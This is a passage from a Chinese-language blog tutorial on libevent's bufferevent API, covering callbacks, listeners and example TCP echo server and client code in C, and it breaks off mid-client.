class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_setcb</span><span class="params">(struct bufferevent *bufev,bufferevent_data_cb readcb,bufferevent_data_cb writecb,bufferevent_event_cb eventcb,<span class="keyword">void</span> *cbarg)</span></span>;</span><br><span class="line"></span><br><span class="line">bufev: bufferevent_socket_new()函数的返回值</span><br><span class="line">readcb:读缓冲对应的回调，自己封装，在其内部读数据</span><br><span class="line">  writecb:设置bufferevent写缓冲 不用，传<span class="literal">NULL</span></span><br><span class="line">  eventcb: 设置事件回调。可传<span class="literal">NULL</span></span><br><span class="line">  cbarg: 回调函数用的参数</span><br></pre></td></tr></table></figure><h5 id="readcb对应的回调函数"><a href="#readcb对应的回调函数" class="headerlink" title="readcb对应的回调函数"></a>readcb对应的回调函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*bufferevent_data_cb)</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *ctx)</span></span>;</span><br></pre></td></tr></table></figure><p>例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line">  ....</span><br><span class="line">  bufferevent_read();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">bufferevent_read</span><span class="params">(struct bufferevent *bufev,<span class="keyword">void</span> *data,<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="comment">//通常用在readcb中，代替read()</span></span><br></pre></td></tr></table></figure><h5 id="writecb对应的回调函数"><a href="#writecb对应的回调函数" class="headerlink" title="writecb对应的回调函数"></a>writecb对应的回调函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line">  ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bufferevent_write</span><span class="params">(struct bufferevent *bufev,<span class="keyword">const</span> <span class="keyword">void</span> *data,<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="comment">//常用在bufferevent_read之后，代替write()</span></span><br></pre></td></tr></table></figure><h5 id="eventcb对应的回调函数"><a href="#eventcb对应的回调函数" class="headerlink" title="eventcb对应的回调函数"></a>eventcb对应的回调函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*bufferevent_event_cb)</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *ctx)</span></span>;</span><br><span class="line"></span><br><span class="line">events: 不同标志位，代表不同的事件</span><br><span class="line">  BEV_EVENT_READING: 读取操作时发生某事件，具体是哪种事件，看其他标志</span><br><span class="line">  BEV_EVENT_WRITING: 写入操作时发生某事件，具体是哪种事件，看其他标志</span><br><span class="line">  BEV_EVENT_ERROR: 操作时发生错误</span><br><span class="line">  BEV_EVENT_TIMEOUT: 发生超时</span><br><span class="line">  BEV_EVENT_EOF: 遇到文件结束指示</span><br><span class="line">  BEV_EVENT_CONNECTED: 请求的连接过程已经完成，实现客户端时可用</span><br></pre></td></tr></table></figure><h4 id="禁用和启用缓冲区"><a href="#禁用和启用缓冲区" class="headerlink" title="禁用和启用缓冲区"></a>禁用和启用缓冲区</h4><p>默认：新建的<code>bufferevent</code>写缓冲时<code>enable</code>的，而读缓冲是<code>disable</code>的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_enable</span><span class="params">(struct bufferevent *bufev,short events)</span></span>;</span><br><span class="line"><span class="comment">//通常用来启用bufferevent的read缓冲</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_disable</span><span class="params">(struct bufferevent *bufev,short events)</span></span>; <span class="comment">//禁用</span></span><br><span class="line"></span><br><span class="line">events: EV_READ、EV_WRITE、EV_READ｜EV_WRITE</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">short <span class="title">bufferevent_get_enabled</span><span class="params">(struct bufferevent *bufev)</span></span>;</span><br><span class="line"><span class="comment">//获取缓冲区的禁用状态，需要借助&amp;来得到</span></span><br></pre></td></tr></table></figure><h4 id="客户端连接服务器"><a href="#客户端连接服务器" class="headerlink" title="客户端连接服务器"></a>客户端连接服务器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bufferevent_socket_connect</span><span class="params">(struct bufferevent *bev,struct sockaddr *address,<span class="keyword">int</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">bev: bufferevent事件对象(封装了fd)</span><br><span class="line">  address: 地址结构</span><br><span class="line">  addrlen: 地址长度</span><br></pre></td></tr></table></figure><h4 id="服务器创建监听器"><a href="#服务器创建监听器" class="headerlink" title="服务器创建监听器"></a>服务器创建监听器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="function">struct evconnlistener * <span class="title">evconnlistener_new</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct event_base *base,</span></span></span><br><span class="line"><span class="function"><span class="params">  evconnlistener_cb cb,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> backlog,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">evutil_socket_t</span> fd</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">evconnlistener</span> *<span class="title">evconnlistener_new_bind</span>(</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">event_base</span> *<span class="title">base</span>,</span></span><br><span class="line"><span class="class">  <span class="title">evconnlistener_cb</span> <span class="title">cb</span>,</span></span><br><span class="line"><span class="class">  <span class="title">void</span> *<span class="title">ptr</span>,</span></span><br><span class="line"><span class="class">  <span class="title">unsigned</span> <span class="title">flags</span>,</span></span><br><span class="line"><span class="class">  <span class="title">int</span> <span class="title">backlog</span>,</span></span><br><span class="line"><span class="class">  <span class="title">const</span> <span class="title">struct</span> <span class="title">sockaddr</span> *<span class="title">sa</span>,</span></span><br><span class="line"><span class="class">  <span class="title">int</span> <span class="title">socklen</span></span></span><br><span class="line"><span class="class">);</span></span><br><span class="line"></span><br><span class="line">cb: 监听回调函数，接受连接之后用户要做的操作</span><br><span class="line">  ptr: 回调函数的参数</span><br><span class="line">flags: “可识别的标志”</span><br><span class="line">    LEV_OPT_CLOSE_ON_FREE: 释放bufferevent时关闭底层传输端口，这将关闭底层套接字，释放底层bufferevent</span><br><span class="line">    LEV_OPT_REUSEABLE: 端口复用，可以<span class="string">"|"</span></span><br><span class="line">  backlog: listen()函数的第二个参数，传<span class="number">-1</span>表示使用默认最大值</span><br><span class="line">  sa: 服务器自己的地址结构体，IP+Port</span><br><span class="line">  socklen: 服务器自己的地址结构体大小</span><br><span class="line"></span><br><span class="line">返回值: 成功创建的监听器</span><br></pre></td></tr></table></figure><h5 id="回调函数类型"><a href="#回调函数类型" class="headerlink" title="回调函数类型"></a>回调函数类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*evconnlistener_cb)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct evconnlistener *listener,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">evutil_socket_t</span> sock,</span></span></span><br><span class="line"><span class="function"><span class="params">  struct sockaddr *addr,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">void</span> *ptr</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line">listener: evconnlistener_new_bind函数的返回值</span><br><span class="line">sock: 用于通信的文件描述符</span><br><span class="line">addr: 客户端的IP+端口</span><br><span class="line">len: addr的len</span><br><span class="line">ptr: 外部ptr传递进来的值</span><br></pre></td></tr></table></figure><h4 id="释放监听服务器"><a href="#释放监听服务器" class="headerlink" title="释放监听服务器"></a>释放监听服务器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evconnlistener_free(listener);</span><br></pre></td></tr></table></figure><h4 id="服务端bufferevent创建TCP连接流程"><a href="#服务端bufferevent创建TCP连接流程" class="headerlink" title="服务端bufferevent创建TCP连接流程"></a>服务端bufferevent创建TCP连接流程</h4><ul><li>创建<code>event_base</code></li><li>创建服务器连接监听器<code>evconnlistener_new_bind()</code></li><li>在<code>evconnlistener_new_bind()</code>的回调函数中，处理接受连接后的操作</li><li>回调函数被调用，说明有一个新的客户端连接，会得到一个新的fd，用于和客户端进行通信</li><li>创建<code>bufferevent</code>事件对象，<code>bufferevent_socket_new()</code>，将fd封装到这个事件对象中</li><li>使用<code>bufferevent_setcb()</code>函数给<code>bufferevent</code>的<code>read、write、event</code>设置回调函数</li><li>设置读缓冲、写缓冲的使能状态 <code>enable、disable</code></li><li>接受、发送数据<code>bufferevent_read()/bufferevent_write()</code></li><li>启动循环<code>event_base_dispatch()</code></li><li>释放资源</li></ul><h4 id="服务端bufferevent实现"><a href="#服务端bufferevent实现" class="headerlink" title="服务端bufferevent实现"></a>服务端bufferevent实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读缓冲区回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">bufferevent_read(bev,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client say : %s\n"</span>,buf);</span><br><span class="line"><span class="keyword">char</span> *p = <span class="string">"我是服务器，已经成功收到你发送的数据！"</span>;</span><br><span class="line">bufferevent_write(bev,p,<span class="built_in">strlen</span>(p)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写缓冲区回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是服务器的写回调函数...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">event_cb</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connection close\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"some other error\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_free(bev);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buffevent资源已经被释放...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cb_listener</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct evconnlistener *listener,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">evutil_socket_t</span> fd,</span></span></span><br><span class="line"><span class="function"><span class="params">struct sockaddr *addr,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> len,<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connect new client\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = (<span class="title">struct</span> <span class="title">event_base</span>*)<span class="title">ptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加新事件</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span>;</span></span><br><span class="line">bev = bufferevent_socket_new(base,fd,BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//给bufferevent缓冲区设置回调</span></span><br><span class="line">bufferevent_setcb(bev,read_cb,write_cb,event_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//启用bufferevent的读缓冲</span></span><br><span class="line">bufferevent_enable(bev,EV_READ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serv,<span class="number">0</span>,<span class="keyword">sizeof</span>(serv));</span><br><span class="line">serv.sin_family = AF_INET;</span><br><span class="line">serv.sin_port = htons(<span class="number">9527</span>);</span><br><span class="line">serv.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建event_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span>;</span> <span class="comment">//监听器</span></span><br><span class="line"><span class="comment">//创建套接字，绑定，接收连接请求</span></span><br><span class="line">listener = evconnlistener_new_bind(base,cb_listener,base,LEV_OPT_CLOSE_ON_FREE | LEV_OPT_REUSEABLE,<span class="number">36</span>,(struct sockaddr*)&amp;serv,<span class="keyword">sizeof</span>(serv));</span><br><span class="line"></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line">evconnlistener_free(listener);</span><br><span class="line">event_base_free(base);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ev_server.c -o ev_server -l event</span><br></pre></td></tr></table></figure><h4 id="客户端bufferevent创建TCP连接流程"><a href="#客户端bufferevent创建TCP连接流程" class="headerlink" title="客户端bufferevent创建TCP连接流程"></a>客户端bufferevent创建TCP连接流程</h4><ul><li>创建<code>event_base</code></li><li>使用<code>bufferevent_socket_new()</code>创建一个用于跟服务器通信的<code>bufferevent</code>事件对象</li><li>使用<code>bufferevent_socket_connect()</code>连接服务器</li><li>使用<code>bufferevent_setcb()</code>给<code>bufferevent</code>对象的<code>read、write、event</code>设置回调</li><li>设置<code>bufferevent</code>对象的读写缓冲区<code>enable/disable</code></li><li>接受、发送数据<code>bufferevent_read()/bufferevent_write()</code></li><li>启动循环监听<code>event_base_dispatch()</code></li><li>释放资源</li></ul><h4 id="客户端bufferevent实现"><a href="#客户端bufferevent实现" class="headerlink" title="客户端bufferevent实现"></a>客户端bufferevent实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读缓冲区回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">bufferevent_read(bev,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"server say : %s\n"</span>,buf);</span><br><span class="line">bufferevent_write(bev,buf,<span class="built_in">strlen</span>(buf)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是客户端的写回调函数....\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">event_cb</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connection close\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"some other error\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_CONNECTED)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"已经成功连接到服务器\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_free(bev);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buffevent资源已经被释放...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_terminal</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len = read(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span> = (<span class="title">struct</span> <span class="title">bufferevent</span>*)<span class="title">arg</span>;</span></span><br><span class="line"><span class="comment">//发送数据</span></span><br><span class="line">bufferevent_write(bev,buf,len+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通信的fd放在bufferevent中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span> = <span class="title">NULL</span>;</span></span><br><span class="line">bev = bufferevent_socket_new(base,fd,BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serv,<span class="number">0</span>,<span class="keyword">sizeof</span>(serv));</span><br><span class="line">serv.sin_family = AF_INET;</span><br><span class="line">serv.sin_port = htons(<span class="number">9527</span>);</span><br><span class="line">inet_pton(AF_INET,<span 